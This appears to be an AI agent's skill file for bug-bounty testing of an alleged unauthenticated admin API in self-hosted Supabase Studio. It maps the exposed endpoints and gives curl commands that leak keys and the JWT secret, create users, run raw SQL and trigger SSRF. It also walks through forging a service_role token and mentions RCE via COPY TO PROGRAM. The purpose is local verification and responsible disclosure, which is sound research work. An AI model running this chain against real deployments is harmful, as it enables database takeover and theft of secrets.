---
name: supabase-self-hosted-studio
category: bug-bounty
description: Test and verify Supabase self-hosted Studio auth issues. Endpoint map for the unauthenticated admin API, verification order, docker/kong inspection, JWT forge proof. Use when hunting or verifying against supabase/supabase (HackerOne) or a local docker stack.
---

# Supabase Self-Hosted Studio Testing

## When to use
- Verifying/reporting the self-hosted Studio unauthenticated admin API (HackerOne supabase program)
- Hunting for new auth bugs in apps/studio (Next.js)
- Any local supabase docker stack (`supabase_studio_*`, `supabase_pg_meta_*` containers)

## Core vulnerability (verified live Aug 2026, unfixed on master 2026-07-31)

`apps/studio/lib/api/apiWrapper.ts` line ~41:
```typescript
if (IS_PLATFORM && withAuth) { ... auth ... }
return handler(req, res, claims)  // handler ALWAYS executes
```
On self-hosted (`IS_PLATFORM=false`) the auth gate NEVER runs, regardless of `withAuth`.
~40 admin endpoints exposed unauthenticated. Fix branch `middleware-studio` (Feb 2026, commit e1635dcbdf) is opt-in, unmerged.

## Endpoint map (all unauthenticated, project ref = `default` on self-hosted)

### Secret leaks
- `GET /api/v1/projects/default/api-keys` — bare handler, returns anon/service_role keys (masked in Jul 2026 image, FULL on master source; `?reveal=true` works on master)
- `GET /api/platform/projects/default/settings` — leaks `jwt_secret` (plaintext)
- `GET /api/platform/projects/default/config/*` — leaks AUTH_JWT_SECRET

### Auth ops (via supabase.auth.admin.*)
- `POST /api/platform/auth/default/users` — create user (email_confirm:true → confirmed)
- `PATCH/DELETE /api/platform/auth/default/users/{id}` — modify/delete users
- `POST /api/platform/auth/default/invite|magiclink|otp|recover` — send emails

### SQL
- `POST /api/platform/pg-meta/default/query` — raw SQL as `postgres` (full DB r/w on this build; RCE via COPY TO PROGRAM only if superuser — CHECK PRIVILEGES FIRST, newer images are non-superuser)

### SSRF
- `POST /api/edge-functions/test` — bare handler, fetches any URL matching `^https?://[^\s/?#]+/functions/v[0-9]{1}/.*$` — internet + docker net + host network (via bridge gateway) reachable, response bodies returned

### Storage
- `GET/POST /api/platform/storage/{ref}/buckets`, `.../buckets/{id}/objects`, `.../sign` etc.

## Verification order (fastest → most proof)

1. `docker ps` → find studio port (often 54343), kong (54341), postgres (54342)
2. `curl -s -i http://localhost:<port>/api/v1/projects/default/api-keys` — expect 200
3. `curl -s http://localhost:<port>/api/platform/projects/default/settings` — grab jwt_secret
4. `curl -s -X POST http://localhost:<port>/api/platform/auth/default/users -H 'Content-Type: application/json' -d '{"email":"x@example.com","password":"Pwn3d!Supabase","email_confirm":true}'` — expect 200 + user object
5. SQL: `curl -s -X POST http://localhost:<port>/api/platform/pg-meta/default/query -d '{"query":"SELECT current_user, version()"}'`
6. CLEANUP: delete the test user, drop any test tables

## JWT forge proof (leaked secret → accepted token)

1. Verify leaked jwt_secret == PostgREST's `PGRST_JWT_SECRET` (docker inspect env or JWKS oct key, base64url-decoded). Match = forge will work.
2. Forge HS256 `{"role":"service_role","iss":"supabase","iat":...,"exp":...}` with the leaked secret.
3. Send as `Authorization: Bearer` AND `apikey` to `http://localhost:<kong_port>/rest/v1/` and `/storage/v1/bucket` — 200 = accepted.
4. Pitfall: sandbox env may hold scrubbed placeholders (`super-secret-jwt-token-...`) — but that placeholder IS often the docker-compose default the running services actually use. Confirm via JWKS/kong.yml before dismissing.

## Deployment intel

- `docker inspect <studio_container>` env — reveals service keys, secrets (often masked placeholders in sandbox)
- `/tmp/supabase-docker/kong.yml` — request-transformer headers hold full new-style keys; routes may show `# TODO: validate apikey`
- pg-meta role on Jul 2026 image: `postgres` non-superuser — `pg_read_file`/`COPY TO PROGRAM` DENIED. Older images were superuser. Run `SELECT rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname=current_user` before claiming RCE.

## Report framing (duplicate-risk management)

- Community knows "studio has no auth" as an OPS issue (discussion #43852) — frame as APPLICATION-LAYER auth flaw on the API endpoints (they accept requests with no auth of their own), cite the unmerged `middleware-studio` fix branch as evidence Supabase treated it as a bug.
- No hacktivity found on the exact API-layer bypass (Aug 2026).
- PoC must be fresh-clone friendly: `git clone supabase/supabase` + docker compose up + poc script.

## Lesson Bank (MANDATORY)
After any verification/submission outcome, append a dated entry to `~/Dev/ATLAS-LEARNINGS/LESSONS.md` §01.
